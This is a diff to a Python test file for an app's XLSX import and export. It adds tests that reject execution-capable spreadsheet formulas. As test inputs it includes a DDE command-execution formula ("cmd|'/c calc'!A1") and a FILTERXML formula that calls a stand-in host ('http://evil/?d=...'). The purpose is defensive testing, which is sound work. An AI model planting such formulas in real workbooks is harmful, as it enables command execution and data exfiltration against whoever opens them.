@@ -6,7 +6,7 @@ from datetime import date
 from xml.etree import ElementTree
 
 import pytest
-from openpyxl import load_workbook
+from openpyxl import Workbook, load_workbook
 from openpyxl.styles import Alignment
 
 from app.artifacts import (
@@ -209,6 +209,84 @@ def test_xlsx_multisheet_formula_style_import_and_export():
     assert workbook["Measurements"]["B3"].value == "=SUM(B2:B2)"
     assert workbook["Measurements"].column_dimensions["A"].width == 24
     workbook.close()
+
+
+def test_sparse_sheet_imports_only_declared_cells():
+    workbook = Workbook()
+    worksheet = workbook.active
+    worksheet.cell(row=200_000, column=1, value="far edge")
+    payload = io.BytesIO()
+    workbook.save(payload)
+    workbook.close()
+
+    imported = import_xlsx(payload.getvalue())
+
+    assert [(cell.row, cell.column, cell.value) for cell in imported.spec.sheets[0].cells] == [
+        (200_000, 1, "far edge")
+    ]
+
+
+def _xlsx_with_formula(formula: str) -> bytes:
+    workbook = Workbook()
+    workbook.active["A1"] = "=1+1"
+    payload = io.BytesIO()
+    workbook.save(payload)
+    workbook.close()
+    rewritten = io.BytesIO()
+    with zipfile.ZipFile(io.BytesIO(payload.getvalue())) as source, zipfile.ZipFile(
+        rewritten, "w"
+    ) as target:
+        for item in source.infolist():
+            data = source.read(item.filename)
+            if item.filename == "xl/worksheets/sheet1.xml":
+                text = data.decode("utf-8")
+                assert "<f>1+1</f>" in text
+                data = text.replace("<f>1+1</f>", f"<f>{formula}</f>", 1).encode("utf-8")
+            target.writestr(item, data)
+    return rewritten.getvalue()
+
+
+def test_xlsx_import_and_export_refuse_dde_formula():
+    with pytest.raises(UnsupportedFeatureError) as imported:
+        import_xlsx(_xlsx_with_formula("cmd|'/c calc'!A1"))
+    assert "external or execution-capable formulas" in imported.value.features
+
+    spec = WorkbookSpec(
+        title="DDE",
+        sheets=[
+            WorkbookSheet(
+                id="s",
+                name="Sheet",
+                cells=[
+                    WorkbookCell(id="a", row=1, column=1, formula="=cmd|'/c calc'!A1")
+                ],
+            )
+        ],
+    )
+    with pytest.raises(UnsupportedFeatureError) as exported:
+        export_xlsx(spec)
+    assert "external or execution-capable formulas" in exported.value.features
+
+
+def test_xlsx_import_and_export_refuse_filterxml():
+    formula = '=FILTERXML("http://evil/?d=static","//a")'
+    with pytest.raises(UnsupportedFeatureError) as imported:
+        import_xlsx(_xlsx_with_formula(formula))
+    assert "external or execution-capable formulas" in imported.value.features
+
+    spec = WorkbookSpec(
+        title="FILTERXML",
+        sheets=[
+            WorkbookSheet(
+                id="s",
+                name="Sheet",
+                cells=[WorkbookCell(id="a", row=1, column=1, formula=formula)],
+            )
+        ],
+    )
+    with pytest.raises(UnsupportedFeatureError) as exported:
+        export_xlsx(spec)
+    assert "external or execution-capable formulas" in exported.value.features
 
 
 def test_xlsx_multiline_wrap_and_row_heights_roundtrip_without_losing_alignment_safety():
